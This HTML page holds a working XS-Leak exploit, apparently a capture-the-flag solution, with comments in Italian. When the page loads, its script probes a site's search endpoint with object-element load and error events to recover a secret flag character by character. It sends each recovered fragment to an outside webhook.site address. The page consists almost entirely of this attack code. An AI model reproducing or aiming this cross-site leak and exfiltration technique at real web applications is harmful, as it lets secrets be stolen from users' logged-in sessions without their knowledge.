<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Flag Extraction</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #result {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>XS-Leak Flag Extraction</h1>
    <div id="result">In attesa di risultati...</div>

    <script>
        const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
        let flag = 'flag{'; // Inizializza con l'inizio del formato della flag
        let position = 5;   // Posizione della lettera attuale nella flag da testare

        // Funzione per verificare se un carattere specifico alla posizione attuale è corretto
        const leakCharacter = async (url) => {
            return new Promise((resolve) => {
                let s = document.createElement('object');
                s.data = url;
                s.onload = (e) => {
                    e.target.remove();
                    resolve(true); // Carattere corretto
                };
                s.onerror = (e) => {
                    e.target.remove();
                    resolve(false); // Carattere non corretto
                };
                document.body.appendChild(s);
            });
        };

        // Funzione che prova ogni carattere alla posizione attuale
        const extractFlag = async () => {
            const resultDiv = document.getElementById('result');
            
            for (let char of characters) {
                // Prova ogni carattere nella posizione corrente
                const url = `https://matrix.capturetheflags.site/search?s=${flag}${char}`;
                const isCorrect = await leakCharacter(url);

                if (isCorrect) {
                    // Aggiorna la flag trovata e sposta alla posizione successiva
                    flag += char;
                    position++;
                    resultDiv.textContent = `Flag parziale trovata: ${flag}`;
                    
                    // Invia il log al Webhook con la flag parziale trovata
                    await logResult(`Flag parziale trovata: ${flag}`);

                    // Se abbiamo trovato "}", terminiamo il ciclo perché la flag è completa
                    if (char === '}') {
                        resultDiv.textContent = `Flag completa trovata: ${flag}`;
                        await logResult(`Flag completa trovata: ${flag}`);
                        return;
                    }

                    // Passa alla lettera successiva nella posizione incrementata
                    break;
                }
            }
            // Ricomincia il processo per la prossima posizione
            setTimeout(extractFlag, 1000); // Ritardo per evitare sovraccarico
        };

        // Funzione per inviare i log al Webhook
        const logResult = async (message) => {
            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad';
            try {
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                const response = await fetch(urlWithParams, {
                    method: 'GET',
                });

                if (!response.ok) {
                    console.error('Errore durante l\'invio del log:', response.statusText);
                } else {
                    console.log('Log inviato con successo');
                }
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        // Avvia l'estrazione della flag al caricamento del DOM
        document.addEventListener('DOMContentLoaded', extractFlag);
    </script>
</body>
</html>
